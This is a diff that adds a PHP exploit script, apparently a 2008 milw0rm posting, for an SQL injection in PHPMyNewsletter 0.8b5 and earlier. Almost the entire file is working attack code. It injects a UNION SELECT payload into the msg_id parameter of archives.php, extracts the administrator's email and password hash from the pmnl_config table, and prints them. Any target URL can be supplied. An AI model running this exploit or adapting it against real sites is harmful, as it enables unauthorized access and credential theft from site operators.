@@ -1,0 +1,54 @@
+#!/usr/bin/php
+<?php
+/*
+ * Name:    PHPMyNewsletter <= 0.8b5 SQL Injection
+ * Credits: Charles "real" F. <charlesfol[at]hotmail.fr>
+ * Date:    03-10-08
+ * Conditions: magic_quotes_gpc=Off
+ *
+ * This exploit gets admin_pass and admin_email from pmnl_config.
+ */
+ 
+print "\n";
+print "   PHPMyNewsletter <= 0.8b5 SQL Injection\n";
+print "       by real <charlesfol[at]hotmail.fr>\n\n";
+ 
+if($argc<2) die("usage: php phpmynewsletter_sql.php <url>\n");
+$url  = $argv[1];
+
+$c = get($url."archives.php?msg_id='%20UNION%20SELECT%201,1,admin_email,admin_pass%20%20FROM%20pmnl_config%2f%2a&list_id=1");
+
+if(preg_match("#<div class='archivetitle'>(.+) - 0000-00-00 00:00:00</div>#i",$c,$a) && preg_match("#<div class='subcontent'>\t([a-f0-9]{32})</div></div>#i",$c,$b))
+{
+	print "[*] Mail:\t$a[1]\n";
+	print "[*] Password:\t$b[1]\n";
+}
+else
+{
+	print "[*] Exploit failed\n";
+}
+
+function get($url,$get=1)
+{
+	$result = '';
+	preg_match("#^http://([^/]+)(/.*)$#i",$url,$infos);
+	$host = $infos[1];
+	$page = $infos[2];
+	$fp = fsockopen($host, 80, &$errno, &$errstr, 30);
+	
+	$req  = "GET $page HTTP/1.1\r\n";
+	$req .= "Host: $host\r\n";
+	$req .= "User-Agent: Mozilla Firefox\r\n";
+	$req .= "Connection: close\r\n\r\n";
+
+	fputs($fp,$req);
+	
+	if($get) while(!feof($fp)) $result .= fgets($fp,128);
+	
+	fclose($fp);
+	return $result;
+}
+
+?>
+
+# milw0rm.com [2008-03-10]
